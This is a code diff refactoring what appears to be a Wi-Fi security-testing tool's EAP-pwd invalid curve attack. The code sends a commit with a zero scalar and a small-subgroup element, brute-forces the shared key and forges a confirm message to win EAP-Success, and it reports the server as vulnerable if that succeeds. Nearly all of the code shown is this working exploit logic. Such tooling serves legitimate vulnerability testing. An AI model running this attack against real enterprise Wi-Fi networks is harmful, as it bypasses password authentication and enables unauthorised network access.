@@ -12,7 +12,7 @@
 #include <tins/hw_address.h>
 
 #include "attacks/Enterprise/eap_defs.h"
-#include "attacks/Enterprise/eap_pwd_reflection.h"
+#include "attacks/Enterprise/eap_helper.h"
 #include "attacks/components/sniffer_helper.h"
 #include "attacks/mc_mitm/MonitorSocket.h"
 #include "config/RunStatus.h"
@@ -158,65 +158,29 @@ static optional<array<uint8_t, 32>> brute_force_k(
     return result;
 }
 
-bool run_invalid_curve_exchange(MonitorSocket& sock, const Channel& channel,
-                                const HWAddress<6>& our_mac, const HWAddress<6>& ap_mac,
-                                string_view ssid, string_view identity, seconds timeout)
-{
-    const milliseconds step{3000};
-    if (!do_auth(sock, channel, our_mac, ap_mac, step)) return false;
-    if (!do_assoc(sock, channel, our_mac, ap_mac, ssid, step)) return false;
+bool run_invalid_curve_exchange(EAP_Att eap_att){
 
-    pcap_t* handle = sock.get_pcap_handle();
-    log(LogLevel::DEBUG, "ic: auth+assoc done, entering EAPOL wait");
-
-    auto wait_eapol = [&](auto pred) -> optional<vector<uint8_t>> {
-        optional<vector<uint8_t>> out;
-        uint32_t n_frames = 0, n_eapol = 0;
-        (void)components::poll_sniffer<bool>(handle, timeout,
-            [&](const u_char* p, const uint32_t caplen) -> optional<bool> {
-                ++n_frames;
-                if (n_frames <= 5 || n_frames % 200 == 0) {
-                    const uint16_t rt_len = caplen >= 4u
-                        ? static_cast<uint16_t>(p[2] | (static_cast<uint16_t>(p[3]) << 8)) : 0;
-                    const int fc0 = (caplen > rt_len) ? p[rt_len] : 0;
-                    log(LogLevel::DEBUG, "ic frame {}: caplen={} fc0={}",
-                        static_cast<int>(n_frames), static_cast<int>(caplen), fc0);
-                }
-                auto eapol = extract_eapol(p, caplen, our_mac);
-                if (eapol.empty()) return nullopt;
-                ++n_eapol;
-                const int eap_code = eapol.size() > 4 ? eapol[4] : 0;
-                const int eap_type = eapol.size() > 8 ? eapol[8] : 0;
-                log(LogLevel::DEBUG, "ic EAPOL {}: code={} type={}",
-                    static_cast<int>(n_eapol), eap_code, eap_type);
-                if (is_eap_success(eapol)) { out = vector<uint8_t>{}; return true; }
-                if (!pred(eapol)) return nullopt;
-                out = std::move(eapol);
-                return true;
-            });
-        log(LogLevel::DEBUG, "ic wait_eapol done: {} raw frames, {} eapol",
-            static_cast<int>(n_frames), static_cast<int>(n_eapol));
-        return out;
-    };
+	if (!do_auth(eap_att)) return false;
+    if (!do_assoc(eap_att)) return false;
 
 	// EAP-Identity
 	{
 		uint8_t eap_id = 0;
-		const auto e = wait_eapol([&](const vector<uint8_t>& v){ return is_identity_request(v, eap_id); });
-        if (!e || e->empty()) { log(LogLevel::WARNING, "No EAP-Identity request"); return false; }
-        send_eapol(sock, channel, our_mac, ap_mac, build_identity_response(eap_id, identity));
+		const auto eapol = wait_eapol(eap_att, [&](const vector<uint8_t>& e){ return is_identity_request(e, eap_id); });
+        if (!eapol || eapol->empty()) { log(LogLevel::WARNING, "No EAP-Identity request"); return false; }
+        send_eapol(eap_att, build_identity_response(eap_id, eap_att.identity));
     }
 
     // EAP-PWD-ID
     {
         optional<EapPwdFrame> frame;
-        const auto e = wait_eapol([&](const vector<uint8_t>& v){
+        const auto e = wait_eapol(eap_att, [&](const vector<uint8_t>& v){
             const auto f = parse_eap_pwd(v);
             if (f && f->opcode == PWD_OPCODE_ID) { frame = f; return true; }
             return false;
         });
         if (!e || e->empty()) { log(LogLevel::WARNING, "No EAP-PWD-ID request"); return false; }
-        send_eapol(sock, channel, our_mac, ap_mac, build_pwd_id_response(*frame, identity));
+        send_eapol(eap_att, build_pwd_id_response(*frame, eap_att.identity));
     }
 
     // EAP-PWD-Commit: capture server commit, send scalar=0 + subgroup_gen as element
@@ -224,7 +188,7 @@ bool run_invalid_curve_exchange(MonitorSocket& sock, const Channel& channel,
     array<uint8_t, 32> server_scal{};
     {
         optional<EapPwdFrame> frame;
-        const auto e = wait_eapol([&](const vector<uint8_t>& v){
+        const auto e = wait_eapol(eap_att, [&](const vector<uint8_t>& v){
             const auto f = parse_eap_pwd(v);
             if (f && f->opcode == PWD_OPCODE_COMMIT) { frame = f; return true; }
             return false;
@@ -244,14 +208,13 @@ bool run_invalid_curve_exchange(MonitorSocket& sock, const Channel& channel,
 
     	// scalar stays zero
         log(LogLevel::INFO, "Sending invalid commit (scalar=0, element=subgroup_gen)");
-        send_eapol(sock, channel, our_mac, ap_mac,
-                   make_pwd_eapol(frame->eap_id, PWD_OPCODE_COMMIT, commit_payload.data(), 96));
+        send_eapol(eap_att, make_pwd_eapol(frame->eap_id, PWD_OPCODE_COMMIT, commit_payload.data(), 96));
     }
 
     // EAP-PWD-Confirm: brute-force k_x, compute and send our confirm
     {
         optional<EapPwdFrame> frame;
-        const auto e = wait_eapol([&](const vector<uint8_t>& v){
+        const auto e = wait_eapol(eap_att, [&](const vector<uint8_t>& v){
             const auto f = parse_eap_pwd(v);
             if (f && f->opcode == PWD_OPCODE_CONFIRM) { frame = f; return true; }
             return false;
@@ -278,12 +241,11 @@ bool run_invalid_curve_exchange(MonitorSocket& sock, const Channel& channel,
 		constexpr array<uint8_t, 32> our_scal{};
 
         const auto our_confirm = pwd_confirm(*kx, our_elem, our_scal, server_elem, server_scal);
-        send_eapol(sock, channel, our_mac, ap_mac,
-                   make_pwd_eapol(frame->eap_id, PWD_OPCODE_CONFIRM, our_confirm.data(), 32));
+        send_eapol(eap_att, make_pwd_eapol(frame->eap_id, PWD_OPCODE_CONFIRM, our_confirm.data(), 32));
     }
 
     // Wait for EAP-Success
-    const auto e = wait_eapol([](const vector<uint8_t>&){ return false; });
+    const auto e = wait_eapol(eap_att, [](const vector<uint8_t>&){ return false; });
     if (e && e->empty()) {
         log(LogLevel::INFO, "[!] EAP-Success – server is vulnerable to invalid curve attack!");
         return true;
@@ -315,11 +277,18 @@ void run_attack(RunStatus& rs) {
     const HWAddress<6> ap_mac(ap_actor.get(SK::mac));
 
     MonitorSocket sock(iface);
-    const bool vulnerable = run_invalid_curve_exchange(sock, channel, our_mac, ap_mac, ssid, identity, seconds(30));
+	EAP_Att eap_att{
+		sock,
+		channel,
+		our_mac,
+		ap_mac,
+		ssid,
+		identity,
+		milliseconds{30000} // 30s
+	};
+	const bool vulnerable = run_invalid_curve_exchange(eap_att);
 
-    nlohmann::json j;
-    j["passed"] = vulnerable;
-    rs.save_result(j);
+	rs.save_result({{"passed", vulnerable}});
     log(LogLevel::INFO, "Invalid curve attack result: {}", vulnerable ? "VULNERABLE" : "not vulnerable");
 }
 
